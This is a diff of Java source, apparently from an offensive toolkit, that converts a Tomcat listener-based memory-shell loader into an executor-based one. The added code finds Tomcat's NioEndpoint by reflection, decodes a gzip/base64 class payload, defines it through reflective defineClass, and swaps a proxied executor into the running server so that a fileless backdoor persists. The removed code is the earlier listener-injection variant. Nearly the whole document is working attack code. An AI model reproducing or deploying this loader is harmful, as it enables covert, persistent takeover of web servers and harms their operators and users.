@@ -1,42 +1,41 @@
 package com.ppp.middleware.loader;
 
+
+import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.*;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.Executor;
+import java.util.concurrent.TimeUnit;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author Whoopsunix
- * <p>
- * 5-10 全版本
+ * ExecutorMS
  */
 @Middleware(Middleware.Tomcat)
-@MemShell({MemShell.Listener})
-public class TomcatThreadLoader {
+@MemShell({MemShell.Executor})
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
+public class TomcatExecutorThreadLoader {
     private static String gzipObject;
-    private static Object[] applicationEventListenersObjects;
-    private static List applicationEventListeners;
-    private static Boolean flag = false;
+    private static String CLASSNAME;
 
-    public TomcatThreadLoader() {
+    public TomcatExecutorThreadLoader() {
     }
 
     static {
         try {
-            Object object = getObject();
+            // 获取
+            Object nioEndpoint = getTargetObject("org.apache.tomcat.util.net.NioEndpoint");
 
-            // 获取 standardContext
-            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
-            if (!flag && !isInject(standardContext, object)) {
-                inject(standardContext, object);
+            if (!isInject(nioEndpoint, null)) {
+                inject(nioEndpoint, null);
             }
 
         } catch (Throwable e) {
@@ -44,97 +43,49 @@ public class TomcatThreadLoader {
         }
     }
 
-//    public static boolean isInject(Object standardContext, Object object) {
-//        return false;
-//    }
-//    public static void inject(Object standardContext, Object object) throws Exception {
-//
-//    }
-
-    /**
-     * Listener
-     */
-    public static boolean isInject(Object standardContext, Object object) {
-        try {
-            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
-            for (int i = 0; i < applicationEventListeners.size(); i++) {
-                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
-                    return true;
-                }
+    public static boolean isInject(Object nioEndpoint, Object object) throws Exception{
+        Object threadPoolExecutor = getFieldValue(nioEndpoint, "executor");
+        if (threadPoolExecutor instanceof Proxy) {
+            Object h = getFieldValue(threadPoolExecutor, "h");
+            if (h.getClass().getName().equalsIgnoreCase(CLASSNAME)) {
+                return true;
             }
-        } catch (Exception e) {
-
         }
 
-        try {
-            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
-            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
-                Object applicationEventListenersObject = applicationEventListenersObjects[i];
-                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
-                    Object h = getFieldValue(applicationEventListenersObject, "h");
-                    Object h2 = getFieldValue(object, "h");
-                    if (h.getClass().getName().contains(h2.getClass().getName())) {
-                        return true;
-                    }
-                } else {
-                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
-                        return true;
-                    }
-                }
-            }
-        } catch (Exception e) {
-
-        }
         return false;
     }
+    public static void inject(Object nioEndpoint, Object object) throws Exception {
+        Object threadPoolExecutor = getFieldValue(nioEndpoint, "executor");
 
-    public static void inject(Object standardContext, Object object) throws Exception {
-        if (applicationEventListenersObjects != null) {
-            // 5 6
-            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
-            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
-            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
-            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
-        } else {
-            // 7 8 9 10
-            invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
-        }
-        flag = new Boolean(true);
-    }
+        Object var1 = invokeMethod(threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
+        Object var2 = invokeMethod(threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
+        Object var3 = invokeMethod(threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
+        Object var4 = TimeUnit.MILLISECONDS;
+        Object var5 = invokeMethod(threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});
 
-    public static Object getObject() throws Exception {
-        // 动态代理兼容 javax jakarta
-        Class servletRequestListenerClass = null;
-        try {
-            servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
-        } catch (Exception e) {
-            try {
-                servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
-            } catch (ClassNotFoundException ex) {
-
-            }
-        }
+        Class ThreadPoolExecutorClass = Class.forName("org.apache.tomcat.util.threads.ThreadPoolExecutor");
+        Object executor = ThreadPoolExecutorClass.getConstructor(Integer.TYPE, Integer.TYPE, Long.TYPE, TimeUnit.class, BlockingQueue.class).newInstance(var1, var2, var3, var4, var5);
 
         byte[] bytes = decompress(gzipObject);
-//            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
-//            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-//            defMethod.setAccessible(true);
-//            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
-//            Object object = cls.newInstance();
-
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
         defineClass.setAccessible(true);
-        Class clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
-        Object javaObject = clazz.newInstance();
+        Class clazz = null;
+        try {
+            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+        } catch (Exception e) {
+            clazz = classLoader.loadClass(CLASSNAME);
+        }
+        Constructor constructor = clazz.getDeclaredConstructor(Object.class);
+        constructor.setAccessible(true);
+        Object javaObject = constructor.newInstance(executor);
 
-        Object object = Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, (InvocationHandler) javaObject);
+        Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class},(InvocationHandler) javaObject);
 
-        return object;
+        nioEndpoint.getClass().getSuperclass().getSuperclass().getMethod("setExecutor", Executor.class).invoke(nioEndpoint, resultObject);
+
     }
 
-
-    // tools
     public static byte[] decompress(String gzipObject) throws IOException {
         final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
         ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
@@ -170,11 +121,6 @@ public class TomcatThreadLoader {
         return field;
     }
 
-    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
-        final Field field = getField(obj.getClass(), fieldName);
-        field.set(obj, value);
-    }
-
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         Method method;
         try {
@@ -188,7 +134,7 @@ public class TomcatThreadLoader {
     }
 
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatThreadLoader().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new TomcatExecutorThreadLoader().getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
@@ -202,6 +148,50 @@ public class TomcatThreadLoader {
         Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);
 
         return result;
+    }
+
+    /**
+     * 遍历 ClassLoader 加载目标 Class
+     */
+    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
+        for (ClassLoader activeClassLoader : activeClassLoaders) {
+            try {
+                return Class.forName(className, true, activeClassLoader);
+            } catch (Throwable e) {
+
+            }
+        }
+        return null;
+    }
+
+    /**
+     * 获取活跃线程
+     */
+    public List<ClassLoader> getActiveClassLoaders() throws Exception {
+        Set<ClassLoader> activeClassLoaders = new HashSet();
+
+        // 加载当前对象的加载器
+        activeClassLoaders.add(this.getClass().getClassLoader());
+
+        // 当前线程的上下文类加载器
+        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());
+
+//        // 应用程序类加载器
+//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
+//        activeClassLoaders.add(systemClassLoader);
+//
+//        // 扩展类加载器
+//        activeClassLoaders.add(systemClassLoader.getParent());
+
+        // 获取线程组
+        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+        Thread[] threads = new Thread[threadGroup.activeCount()];
+        int count = threadGroup.enumerate(threads, true);
+        for (int i = 0; i < count; i++) {
+            activeClassLoaders.add(threads[i].getContextClassLoader());
+        }
+
+        return new ArrayList(activeClassLoaders);
     }
 
     /**
@@ -302,51 +292,6 @@ public class TomcatThreadLoader {
         }
 
         return null;
-    }
-
-
-    /**
-     * 遍历 ClassLoader 加载目标 Class
-     */
-    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
-        for (ClassLoader activeClassLoader : activeClassLoaders) {
-            try {
-                return Class.forName(className, true, activeClassLoader);
-            } catch (Throwable e) {
-
-            }
-        }
-        return null;
-    }
-
-    /**
-     * 获取活跃线程
-     */
-    public List<ClassLoader> getActiveClassLoaders() throws Exception {
-        Set<ClassLoader> activeClassLoaders = new HashSet();
-
-        // 加载当前对象的加载器
-        activeClassLoaders.add(this.getClass().getClassLoader());
-
-        // 当前线程的上下文类加载器
-        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());
-
-//        // 应用程序类加载器
-//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
-//        activeClassLoaders.add(systemClassLoader);
-//
-//        // 扩展类加载器
-//        activeClassLoaders.add(systemClassLoader.getParent());
-
-        // 获取线程组
-        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
-        Thread[] threads = new Thread[threadGroup.activeCount()];
-        int count = threadGroup.enumerate(threads, true);
-        for (int i = 0; i < count; i++) {
-            activeClassLoaders.add(threads[i].getContextClassLoader());
-        }
-
-        return new ArrayList(activeClassLoaders);
     }
 
 }
